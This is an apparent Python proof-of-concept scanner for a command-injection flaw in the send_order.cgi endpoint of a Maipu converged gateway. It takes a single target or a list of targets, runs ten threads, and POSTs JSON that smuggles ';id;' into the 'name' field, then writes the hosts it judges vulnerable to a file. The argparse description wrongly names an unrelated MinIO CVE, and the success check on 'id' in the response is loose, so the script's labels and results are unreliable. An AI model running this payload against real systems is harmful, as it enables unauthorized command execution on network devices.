# 迈普多业务融合网关 send_order.cgi 命令执行漏洞
import requests,argparse,sys,time,warnings
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    banner()
    parser = argparse.ArgumentParser(description="CVE-2023-28432 MiniO信息泄露漏洞复现")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
        mp = Pool(10)  
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")


def poc(target):
    url_payload = '/send_order.cgi?parameter=operation'
    header = {
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept-Encoding": "gzip, deflate"
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    data = """{"opid": "1", "name": ";id;","type": "rest"}"""
    try:
        res2 = requests.post(url=target + url_payload, data=data, headers=header, verify=False,proxies=proxies,timeout=10)
        if res2.status_code == 200 and "id" in res2.text:
            print(f"[+]该url{target}存在命令执行漏洞")
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
                return True
        else:
            print(f'[-]该url{target}不存在命令执行漏洞')
    except Exception:
        print(f'[*]该网站{target}可能存在问题，请手工测试')

if __name__ == '__main__':
    main()